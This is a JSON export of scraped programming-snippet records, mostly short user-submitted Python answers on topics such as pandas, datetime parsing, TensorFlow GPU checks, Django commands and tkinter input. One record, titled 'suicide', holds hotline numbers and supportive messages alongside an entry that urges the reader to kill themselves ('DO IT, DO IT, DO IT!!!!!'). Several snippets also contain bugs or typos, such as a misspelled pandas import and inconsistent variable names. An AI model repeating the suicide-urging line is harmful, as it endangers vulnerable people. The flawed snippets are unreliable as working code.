    "description": "def get_stackoverflow(query):     import urllib, urllib2, re, urlparse     params = urllib.urlencode({'q': query, 'sort': 'relevance'})     html = urllib2.urlopen(\"http://stackoverflow.com/search?%s\" % params).read()     links = re.findall(r'<h3><a href=\"([^\"]*)\" class=\"answer-title\">([^<]*)</a></h3>', html)     links = [(urlparse.urljoin('http://stackoverflow.com/', url), title) for url,title in links]      return links \n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4430,
    "keyword": null,
    "link": null,
    "title": " standard deviation in python",
    "description": "import numpy as np dataset=[13, 22, 26, 38, 36, 42,49, 50, 77, 81, 98, 110] print('Standard Deviation:', np.std(dataset))  Standard Deviation: 29.694275542602483\nimport numpy as np values=[1,10,100] print(np.std(values)) values=[1,10,100,np.nan] print(np.nanstd(values))\na = [1,2,3,4,5] numpy.std(a) # will give the standard deviation of a\nimport panda as pd df = pd.DataFrame(data) window=5 running_vol=df['x'].rolling(window).std()\n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4431,
    "keyword": null,
    "link": null,
    "title": " standardize columns in pandas",
    "description": "columns = ['A', 'B','C'] #specify the column names for col in columns:   df[col] = (df[col] - df[col].mean())/df[col].std()    \n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4432,
    "keyword": null,
    "link": null,
    "title": " standardscaler into df data frame pandas",
    "description": "scaled_features = StandardScaler().fit_transform(df.values) scaled_features_df = pd.DataFrame(scaled_features, index=df.index, columns=df.columns)\n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4433,
    "keyword": null,
    "link": null,
    "title": " start a simple http server python3",
    "description": "python3 -m http.server 8000\npython -m SimpleHTTPServer\n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4434,
    "keyword": null,
    "link": null,
    "title": " start new app in django",
    "description": "python manage.py startapp app_name\npython manage.py startapp # name of the app\n$ python manage.py startapp app_name\n$ python manage.py startapp polls \n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4435,
    "keyword": null,
    "link": null,
    "title": " starting server in django",
    "description": "python manage.py startapp app_name\n# to start a django server cd to dir with manage.py file and type following python manage.py runserver \npython manage.py startapp # name of the app\n#In your terminal python3 manage.py runserver\npython3 manage.py runserver or python manage.py runserver\n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4436,
    "keyword": null,
    "link": null,
    "title": " static class python",
    "description": "#To create a static method, just add \"@staticmethod\" before defining it.  >>>class Calculator:     # create static method     @staticmethod     def multiplyNums(x, y):         return x * y  >>>print('Product:', Calculator.multiplyNums(15, 110)) Product:1650\n>>> class MyClass: ...     i = 3 ... >>> MyClass.i 3 \n# Instance Method Example in Python  class Student:          def __init__(self, a, b):         self.a = a         self.b = b           def avg(self):         return (self.a + self.b) / 2  s1 = Student(10, 20) print( s1.avg() )\nimport os clear = lambda: os.system('cls')\nclass Example:   staticVariable = 5    print(Example.staticVariable)  # Prints '5'  instance = Example() print(instance.staticVariable)  # Prints '5'  instance.staticVaraible = 6 print(instance.staticVariabel)  # Prints '6' print(Example.staticVariable)  # Prints '5'  Example.staticVariable = 7 print(Example.staticVariable)  # Prints '7'\n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4437,
    "keyword": null,
    "link": null,
    "title": " stop a function from continuing when a condition is met python",
    "description": "# use return e.g def test_function(input):   if input == 5:     return    else:     print(input)      #f you run  test_function(5) #the function will simply just end    \n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4438,
    "keyword": null,
    "link": null,
    "title": " stop if code python",
    "description": "import sys sys.exit()\n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4439,
    "keyword": null,
    "link": null,
    "title": " streamlit pip",
    "description": "pip install streamlit\npip install streamlit \nstreamlit run myfile.py \n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4440,
    "keyword": null,
    "link": null,
    "title": " string of numbers to list of integers python",
    "description": "a_string = \"1 2 3\" a_list = a_string. split() #a_list >>> ['1','2','3'] int_list = [int(i) for i in list] \n[int(s) for s in example_string.split(',')] \n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4441,
    "keyword": null,
    "link": null,
    "title": " string pick the first 2 characters python",
    "description": "t = \"your string\" t[:2]\n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4442,
    "keyword": null,
    "link": null,
    "title": " string to date python",
    "description": "import datetime  date_time_str = '2018-06-29 08:15:27.243860' date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')  print('Date:', date_time_obj.date()) print('Time:', date_time_obj.time()) print('Date-time:', date_time_obj) \nfrom datetime import datetime  datetime_str = '09/19/18 13:55:26'  datetime_object = datetime.strptime(datetime_str, '%m/%d/%y %H:%M:%S')  print(type(datetime_object)) print(datetime_object)  # printed in default format \ndate_str = '09-19-2018'  date_object = datetime.strptime(date_str, '%m-%d-%Y').date() print(type(date_object)) print(date_object)  # printed in default formatting \nfrom datetime import datetime  datetime_object = datetime.strptime('Jun 1 2005  1:33PM', '%b %d %Y %I:%M%p')\nimport datetime  # str value \"Apr 2, 2019\" convert into any format.  datetime.datetime.strptime('Apr 2, 2019', '%b %d, %Y').strftime('%a, %d %b %Y')\nfrom dateutil import parser datetime_object = parser.parse(\"Jun 1 2020  1:36PM\")\n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4443,
    "keyword": null,
    "link": null,
    "title": " string to datetime convert",
    "description": "import datetime  date_time_str = '2018-06-29 08:15:27.243860' date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')  print('Date:', date_time_obj.date()) print('Time:', date_time_obj.time()) print('Date-time:', date_time_obj) \ndependencies:   intl: ^0.17.0    import 'package:intl/intl.dart';  DateFormat dateFormat = DateFormat(\"yyyy-MM-dd HH:mm:ss\");  String string = dateFormat.format(DateTime.now()); //Converting DateTime object to String  DateTime dateTime = dateFormat.parse(\"2019-07-19 8:40:23\"); //Converting String to DateTime object\n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4444,
    "keyword": null,
    "link": null,
    "title": " string to hex python",
    "description": ">>> bytes.fromhex('HexValue').decode('utf-8') 'string' >>> bytes.fromhex('7368616b6564').decode('utf-8') 'shaked'\nhex_string = \"0xAA\" # \"0x\" also required  an_integer = int(hex_string, 16) # an_integer is a decimal value  hex_value = hex(an_integer) print(hex_value)\n>>> s = 'The quick brown fox jumps over the lazy dog.'.encode('utf-8') >>> s b'The quick brown fox jumps over the lazy dog.' >>> s.hex() '54686520717569636b2062726f776e20666f78206a756d7073206f76657220746865206c617a7920646f672e' \n",
    "reg_date": "2021-10-12T11:35:09.000Z"
  },
  {
    "id": 4445,
    "keyword": null,
    "link": null,
    "title": " string validators hackerrank solution",
    "description": "if __name__ == '__main__':     s = input()     print(any(i.isalnum() for i in s))     print(any(i.isalpha() for i in s))     print(any(i.isdigit() for i in s))     print(any(i.islower() for i in s))     print(any(i.isupper() for i in s))  #The any() function returns True if any item in an iterable are true, #otherwise it returns False. #If the iterable object is empty, the any() function will return False.\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4446,
    "keyword": null,
    "link": null,
    "title": " stripping /n in a readlines for a pytgon file",
    "description": "alist = [line.rstrip() for line in open('filename.txt')]\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4447,
    "keyword": null,
    "link": null,
    "title": " strptime python decimal seconds",
    "description": ">>> from datetime import datetime >>> a = datetime.strptime('26/01/12 23:50:32.123', '%d/%m/%y %H:%M:%S.%f') >>> a.microsecond \n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4448,
    "keyword": null,
    "link": null,
    "title": " subplot adjust python",
    "description": "plt.subplots_adjust(wspace=0.5)\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4449,
    "keyword": null,
    "link": null,
    "title": " subplot matplotlib set limits",
    "description": "  ax1.set_xlim([0,3000])   ax1.set_ylim([0,20])\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4450,
    "keyword": null,
    "link": null,
    "title": " subprocess the system cannot find the file specified",
    "description": "import subprocess subprocess.run(\"ls\", shell=True) #shell = True\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4451,
    "keyword": null,
    "link": null,
    "title": " sudoku solver python",
    "description": "board = [     [7,8,0,4,0,0,1,2,0],     [6,0,0,0,7,5,0,0,9],     [0,0,0,6,0,1,0,7,8],     [0,0,7,0,4,0,2,6,0],     [0,0,1,0,5,0,9,3,0],     [9,0,4,0,6,0,0,0,5],     [0,7,0,3,0,0,0,1,2],     [1,2,0,0,0,7,4,0,0],     [0,4,9,2,0,6,0,0,7] ]  def solve(bo): # this function has recursion, which its own function within itself. Every layer of function within each function, is an empty space after an empty space.   find = find_empty(bo)   if not find: return True # If it can't find an empty space, it stops the function. The 'solve' function will only return 'True' when the sudoku has been solved.   else: row, col = find # retrieves the row and column of the empty space.      for i in range (1,10): # 'i' (refered to as num in the valid function) refers to the numbers that are tested in the previously empty position.      if valid(bo, i, (row, col)):  # if the 'for loop' and 'valid' function find a valid entry, it       bo[row][col] = i # ...will be inserted into the board, and...       if solve(bo): # ...it will restart the solve function on the recently updated board to find a valid value for the next empty space, but if the solve function has been declared 'True' because an empty space could not be found when find_empty was run at the beginning of the function, ...         return True # ...this function will return 'True', causing the the function (itself) that called this line to continue running from the 'if statement' that called this line to return 'True', which causes this line to return 'True'. This will repeat until all of the previous recursive calls of this function have returned 'True'.       bo[row][col] = 0 # Python will only run this code if it knows that the next/following recursive call has returned 'False'. If the code is running the last iteration of the 'for loop', the previous recursive call can return to the space that this recursive call is running, because this line declares this recursive call's space as zero (a.k.a., an empty value).     return False # The function will return 'False' if a valid value for a space could not be found (i.e., all the iterations for the space could not be found), causing it to continue running the 'for loop' of the previous space from the second 'if statement'.   def valid(bo, num, pos): #this checks if a value entry into a space is valid by checking if that same value is already in the same row, column, or box. It will return 'True' if it has found a valid solution.   # Check row. # Because of how the solve function called pos, pos[0] refers to the row and pos[1] refers to the column.   for i in range(len(bo[0])): # the 'i' refers to the x-value (or column) of the position.     if bo[pos[0]][i] == num and pos[1] != i: # if each element in the row == recently added number as long as it isnt in the position that we just inserted.       return False    # Check column.   for i in range(len(bo)):     if bo[i][pos[1]] == num and pos[0] != i:        return False      # Check Box of 3 by 3   box_x = pos[1] // 3   box_y = pos[0] // 3   for i in range(box_y*3, box_y*3 + 3): # this loops through the 3 by 3 box to check whether we have the same element appearing twice.     for j in range(box_x*3, box_x*3 + 3):       if bo[i][j] == num and (i,j) != pos:         return False   return True # a function stops running when it reaches a return statement.   def print_board(bo):   for i in range(len(bo)): # for loop iterating through each row.  'i' is the row, and 'j' is each value in each row.      if i % 3 == 0 and i != 0: print(\"- - - - - - - - - - - -\")          for j in range(len(bo[0])): #iterating through each column of each row.       if j % 3 == 0 and j != 0: print(\" | \", end=\"\")                if j == 8: print(bo[i][j])       else: print(bo[i][j], end=\" \")   def find_empty(bo): #this finds empty spaces.   for i in range(len(bo)):     for j in range(len(bo[0])):       if bo[i][j] == 0:         return (i, j) # row, then column of empty spaces.   return None   # execution print_board(board) print('\\n\\t {}\\n'.format(solve(board))) print_board(board)\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4452,
    "keyword": null,
    "link": null,
    "title": " suicide",
    "description": "print(\"Don't do it.\")\n800-273-8255\nWill it be good for you?\nDon't do it! No matter what you think, the world needs you and loves you! \nSuicide is never the answer\nI wish I could just die  I love you world and my friends and family but I was useless. I didnt want to be me I promise I tried changin whoI am but I found it impossible.  With love me 0/\n+1(800)273-8255\nDO IT, DO IT, DO IT!!!!!\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4453,
    "keyword": null,
    "link": null,
    "title": " sum number in a list python using recursion",
    "description": "def listsum(numList):    if len(numList) == 1:         return numList[0]    else:         return numList[0] + listsum(numList[1:])  print(listsum([1,3,5,7,9]))\n",
    "reg_date": "2021-10-12T11:35:10.000Z"
  },
  {
    "id": 4454,
    "keyword": null,
    "link": null,
    "title": " sum of a column in pandas",
    "description": "Total = df['MyColumn'].sum() print (Total) 319 \nimport numpy as np import pandas as pd   df = pd.DataFrame({'a': [10,20],'b':[100,200],'c': ['a','b']})  df.loc['Column_Total']= df.sum(numeric_only=True, axis=0) df.loc[:,'Row_Total'] = df.sum(numeric_only=True, axis=1)  print(df)                   a      b    c  Row_Total 0             10.0  100.0    a      110.0 1             20.0  200.0    b      220.0 Column_Total  30.0  300.0  NaN      330.0\ndf.sum()\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4455,
    "keyword": null,
    "link": null,
    "title": " sum of all nan values pandas",
    "description": "df.isnull().sum(axis = 0)\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4456,
    "keyword": null,
    "link": null,
    "title": " sum of prime numbers python",
    "description": "ending_range = int(input(\"Find sum of prime numbers upto : \"))  total = 0  for num in range(2, ending_range + 1):      i = 2          for i in range(2, num):         if (int(num % i) == 0):             i = num             break;      #If the number is prime then add it.     if i is not num:         total += num  print(\"\\nSum of all prime numbers till\", ending_range, \":\", total)\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4457,
    "keyword": null,
    "link": null,
    "title": " superscript print python",
    "description": "print(\"Superscript: x\\u00b2\")\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4458,
    "keyword": null,
    "link": null,
    "title": " suppres tensorflow warnings",
    "description": "You can use this: import os import tensorflow as tf os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'  In detail:- 0 = all messages are logged (default behavior) 1 = INFO messages are not printed 2 = INFO and WARNING messages are not printed 3 = INFO, WARNING, and ERROR messages are not printed\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4459,
    "keyword": null,
    "link": null,
    "title": " supprimer fichier pythpn",
    "description": "import os os.remove(\"/path/file.txt\")\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4460,
    "keyword": null,
    "link": null,
    "title": " swap keys and values in dictionary python",
    "description": "my_dict = {2:3, 5:6, 8:9}  new_dict = {} for k, v in my_dict.items():     new_dict[v] = k\nmy_dict = {'x':1, 'y':2, 'z':3} my_swapped_dict = {v: k for k, v in my_dict.items()} #{1: 'x', 2: 'y', 3: 'z'}\nold_dict = {'A': 67, 'B': 23, 'C': 45, 'D': 56, 'E': 12, 'F': 69, 'G': 67, 'H': 23}     new_dict = dict([(value, key) for key, value in old_dict.items()]) print(new_dict) for i in new_dict:      print(i, \" :  \", new_dict[i])\ndict = {value:key for key, value in dict.items()} \n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4461,
    "keyword": null,
    "link": null,
    "title": " swapping in python",
    "description": "x = 5 y = 10  x, y = y, x print(\"x =\", x) print(\"y =\", y) \na=5 b=10 a,b=b,a  #swapped \na = 10 b = 20 print(\"not swiped value of a is\",a) print(\"not swiped value of b is\",b) stored_value = a a = b b = stored_value print(\"swiped value of a is\",a) print(\"swiped value of b is\",b)  \na = 5 b = 6 # now swp the variables a, b = b, a # to swap two variables you need an other string harder than the first one c = a\t# 5 a = b\t# 6 b = c\t# 5\na = 1 b = 2  a, b = b, a # a = 2 , b = 1\ndef swap0(s1, s2):     assert type(s1) == list and type(s2) == list     tmp = s1[:]     s1[:] = s2     s2[:] = tmp      # However, the easier and better way to do a swap in Python is simply: s1, s2 = s2, s1\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4462,
    "keyword": null,
    "link": null,
    "title": " switching keys and values in a dictionary in python [duplicate]",
    "description": "my_dict = {2:3, 5:6, 8:9}  new_dict = {} for k, v in my_dict.items():     new_dict[v] = k\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4463,
    "keyword": null,
    "link": null,
    "title": " sys get current pythonpath",
    "description": "import os os.path.dirname(os.path.abspath(__file__))\nJust specify all posible files names in current directory with regex *: findstr string_to_search *\nimport sys print(sys.version) print(sys.path)\n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4464,
    "keyword": null,
    "link": null,
    "title": " télécharger dataframe python extract",
    "description": "df.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv', index = False) \n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4465,
    "keyword": null,
    "link": null,
    "title": " take input tkinter in python 3",
    "description": "import tkinter as tk  def show_entry_fields():     print(\"First Name: %s\\nLast Name: %s\" % (e1.get(), e2.get()))     e1.delete(0, tk.END)     e2.delete(0, tk.END)  master = tk.Tk() tk.Label(master, text=\"First Name\").grid(row=0) tk.Label(master, text=\"Last Name\").grid(row=1)  e1 = tk.Entry(master) e2 = tk.Entry(master) e1.insert(10, \"Miller\") e2.insert(10, \"Jill\")  e1.grid(row=0, column=1) e2.grid(row=1, column=1)  tk.Button(master,            text='Quit',            command=master.quit).grid(row=3,                                      column=0,                                      sticky=tk.W,                                      pady=4) tk.Button(master, text='Show', command=show_entry_fields).grid(row=3,                                                                 column=1,                                                                 sticky=tk.W,                                                                 pady=4)  master.mainloop()  tk.mainloop() \n",
    "reg_date": "2021-10-12T11:35:11.000Z"
  },
  {
    "id": 4466,
    "keyword": null,
    "link": null,
    "title": " take off character in python string",
    "description": "s = 'abc12321cba'  print(s.replace('a', '')) \n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4467,
    "keyword": null,
    "link": null,
    "title": " take space separated int input in python",
    "description": "inp = list(map(int,input().split()))\n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4468,
    "keyword": null,
    "link": null,
    "title": " taking String input from user in python",
    "description": "name = input(\"What is your name?\\n\") # Asks the user 'What is your name?' and stores it in the 'name' variable  print(\"You said your name was \" + name)  number = int(input(\"Please select a random number:\\n\")) # Will get input as a number # Will error if the value entered is not a number  # You can use any type of conversion (int(), bool(), float(), etc.) to modify your input  \nUser_Name = str(input(\"What is your name:- \")) print(\"Hi \"+User_Name+\" It's me python\")\n# Store input numbers num1 = input('Enter first number: ') num2 = input('Enter second number: ')  # Add two numbers sum = float(num1) + float(num2)  # Display the sum print('The sum of {0} and {1} is {2}'.format(num1, num2, sum))\n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4469,
    "keyword": null,
    "link": null,
    "title": " taking string input from user in python with try except",
    "description": "try: \tUser_Name = input(\"What is your name:- \") \tprint(\"Hi \"+User_Name+\"It's me python\") except:   print(\"The user Name Is incorrect\")\n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4470,
    "keyword": null,
    "link": null,
    "title": " telegram bot send message every hour python",
    "description": "def check_the_week(bot, update): reply_keyboard = [['YES', 'NO']] bot.send_message(     chat_id=update.message.chat_id,     text=report,      reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True))  # sends the total nr of hours update.reply_text(\"Did you report all you working hour on freshdesk for this week?\",                   ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True))  if update.message.text == \"YES\":     update.message.reply_text(text=\"Are you sure?\",                               reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True))      # Asks confirmation     if update.message.text == \"YES\":         update.message.reply_text(text=\"Thank you for reporting your working hours in time!\")      elif update.message.text == \"NO\":         update.message.reply_text(text=\"Please, check you time reports and add missing\")  elif update.message.text == \"NO\":     update.message.reply_text(text=\"Please, check you time reports and add missing\") \n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4471,
    "keyword": null,
    "link": null,
    "title": " telegram markdown syntax",
    "description": "**bold**  __italic__  --underline--  ~~strike~~  [text URL](https://docs.pyrogram.org/)  [text user mention](tg://user?id=23122162)  `inline fixed-width code`  ``` pre-formatted   fixed-width     code block ``` \n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4472,
    "keyword": null,
    "link": null,
    "title": " telethon get channel id",
    "description": "# Dialogs are the \"conversations you have open\". # This method returns a list of Dialog, which # has the .entity attribute and other information. dialogs = client.get_dialogs()  # All of these work and do the same. lonami = client.get_entity('lonami') lonami = client.get_entity('t.me/lonami') lonami = client.get_entity('https://telegram.dog/lonami')  # Other kind of entities. channel = client.get_entity('telegram.me/joinchat/AAAAAEkk2WdoDrB4-Q8-gg') contact = client.get_entity('+34xxxxxxxxx') friend  = client.get_entity(friend_id)  # Getting entities through their ID (User, Chat or Channel) entity = client.get_entity(some_id)  # You can be more explicit about the type for said ID by wrapping # it inside a Peer instance. This is recommended but not necessary. from telethon.tl.types import PeerUser, PeerChat, PeerChannel  my_user    = client.get_entity(PeerUser(some_id)) my_chat    = client.get_entity(PeerChat(some_id)) my_channel = client.get_entity(PeerChannel(some_id))\n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4473,
    "keyword": null,
    "link": null,
    "title": " tensorflow check gpu",
    "description": "import tensorflow as tf print(tf.test.gpu_device_name())\n# As it's written in Tensorflow documentatoin:   import tensorflow as tf print(\"Num GPUs Available: \", len(tf.config.experimental.list_physical_devices('GPU')))\ntf.config.list_physical_devices('GPU')\ntf.test.is_gpu_available(   cuda_only=False, min_cuda_compute_capability=None )\n$ pip uninstall tensorflow $ pip install tensorflow-gpu \n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4474,
    "keyword": null,
    "link": null,
    "title": " tensorflow gpu test",
    "description": "# As it's written in Tensorflow documentatoin:   import tensorflow as tf print(\"Num GPUs Available: \", len(tf.config.experimental.list_physical_devices('GPU')))\ntf.config.list_physical_devices('GPU')\ntf.test.is_gpu_available(   cuda_only=False, min_cuda_compute_capability=None )\n# For tensorflow 2: print(\"Num GPUs Available: \", len(tf.config.list_physical_devices('GPU')))  # For tensorflow 1: sess = tf.Session(config=tf.ConfigProto(log_device_placement=True))\n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4475,
    "keyword": null,
    "link": null,
    "title": " tensot to numpy pytorch",
    "description": "#Back and forth between torch tensor and numpy  #np --> tensot torch.from_numpy(your_numpy_array)  #tensor --> np your_torch_tensor.numpy()\n",
    "reg_date": "2021-10-12T11:35:12.000Z"
  },
  {
    "id": 4476,
    "keyword": null,
    "link": null,
    "title": " termcolor python",
    "description": "# To install termcolor pip install termcolor\nimport sys from termcolor import colored, cprint  text = colored('Hello, World!', 'red', attrs=['reverse', 'blink']) print(text) cprint('Hello, World!', 'green', 'on_red')  print_red_on_cyan = lambda x: cprint(x, 'red', 'on_cyan') print_red_on_cyan('Hello, World!') print_red_on_cyan('Hello, Universe!')  for i in range(10):     cprint(i, 'magenta', end=' ')  cprint(\"Attention!\", 'red', attrs=['bold'], file=sys.stderr) \n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4477,
    "keyword": null,
    "link": null,
    "title": " terminal python version",
    "description": "# in python $ python --version  # in python3 $ python3 --version\npython --version #in command line  python #or by enterng interactiv mode\n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4478,
    "keyword": null,
    "link": null,
    "title": " text size legend to bottom matplotlib",
    "description": "plot.legend(loc=2, prop={'size': 6}) \n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4479,
    "keyword": null,
    "link": null,
    "title": " text to speech to specific language python",
    "description": "from gtts import gTTS from playsound import  playsound  mytext=\"Hello Geek! How are you doing??\" language='en' myobj=gTTS(text=mytext,lang=language,slow=True) myobj.save(\"welcome1.mp3\") playsound(\"welcome1.mp3\")\n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4480,
    "keyword": null,
    "link": null,
    "title": " tf.contrib.layers.xavier initializer() tf2",
    "description": "shape = (3,3) initializer = tf.initializers.GlorotUniform() var = tf.Variable(initializer(shape=shape))\n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4481,
    "keyword": null,
    "link": null,
    "title": " tf.expand dims",
    "description": "tf.expand_dims(     input, axis, name=None )  Given a tensor input, this operation inserts a dimension of size 1  at the dimension index axis of input's shape. The dimension index  axis starts at zero; if you specify a negative number for axis it is  counted backward from the end. This operation is useful if you want to add a batch dimension to a  single element. For example, if you have a single image of shape  [height, width, channels], you can make it a batch of one image with  expand_dims(image, 0), which will make the shape  [1, height, width, channels].\n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4482,
    "keyword": null,
    "link": null,
    "title": " tf 1 compatible colab",
    "description": "Specifying the TensorFlow version Running   import tensorflow   will import the default version (currently 2.x). You can use 1.x  by running a cell with the   %tensorflow_version 1.x  magic before you run import tensorflow. \n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4483,
    "keyword": null,
    "link": null,
    "title": " tf tensor from numpy",
    "description": "tf.convert_to_tensor(my_np_array, dtype=tf.float32)\n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4484,
    "keyword": null,
    "link": null,
    "title": " tf version",
    "description": "python -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 2 python3 -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 3\npython3 import tensorflow as tf tf.__version__\npython -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 2 python3 -c 'import tensorflow as tf; print(tf.__version__)'  # for Python 3 \npip show tensorflow \n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4485,
    "keyword": null,
    "link": null,
    "title": " that port in use",
    "description": "sudo fuser -k 8000/tcp\n",
    "reg_date": "2021-10-12T11:35:13.000Z"
  },
  {
    "id": 4486,
    "keyword": null,
    "link": null,
    "title": " the four pillars of Op in Python",
    "description": "Object-Oriented Programming.  \tEncapsulation,      Abstraction,      Polymorphism,     Inheritance.\n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4487,
    "keyword": null,
    "link": null,
    "title": " the month before python dateime",
    "description": " import datetime  today = datetime.date.today()  first = today.replace(day=1)  lastMonth = first - datetime.timedelta(days=1)  print(lastMonth.strftime(\"%Y%m\"))\n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4488,
    "keyword": null,
    "link": null,
    "title": " the operands of the logical operators should be boolean expressions, but python is not very strict. any nonzero number is interpreted as true.",
    "description": "      x != y               # x is not equal to y       x > y                # x is greater than y       x < y                # x is less than y       x >= y               # x is greater than or equal to y       x <= y               # x is less than or equal to y       x is y               # x is the same as y       x is not y           # x is not the same as y\n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4489,
    "keyword": null,
    "link": null,
    "title": " the user to enter their name and display each letter in their name on a separate line python",
    "description": "wq=input(\"enter your name: \") word= wq for index,letter in enumerate(word,1):     print(index,\":\",letter) \n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4490,
    "keyword": null,
    "link": null,
    "title": " the zen of python",
    "description": "# To read The Zen of Python, type in:  import this  # But I just can't resist putting The Zen of Python in here anyway.    \"\"\"  The Zen of Python, by Tim Peters  Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those!  \"\"\"   \"\"\" If you are wondering what this is about, the Zen of Python is basically a set of rules Python  programmers should try to follow. But, keep in mind that this is **TOTALLY OPTIONAL**. \"\"\"\nBeautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those! \n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4491,
    "keyword": null,
    "link": null,
    "title": " thousands separator python",
    "description": ">>> num = 10000000 >>> print(f\"{num:,}\") 10,000,000 \n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4492,
    "keyword": null,
    "link": null,
    "title": " threading python geeks f",
    "description": "import threading  def print_cube(num):     \"\"\"     function to print cube of given num     \"\"\"     print(\"Cube: {}\".format(num * num * num))    def print_square(num):     \"\"\"     function to print square of given num     \"\"\"     print(\"Square: {}\".format(num * num))    if __name__ == \"__main__\":     # creating thread     t1 = threading.Thread(target=print_square, args=(10,))     t2 = threading.Thread(target=print_cube, args=(10,))        # starting thread 1     t1.start()     # starting thread 2     t2.start()        # wait until thread 1 is completely executed     t1.join()     # wait until thread 2 is completely executed     t2.join()        # both threads completely executed     print(\"Done!\")\n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4493,
    "keyword": null,
    "link": null,
    "title": " throw error python",
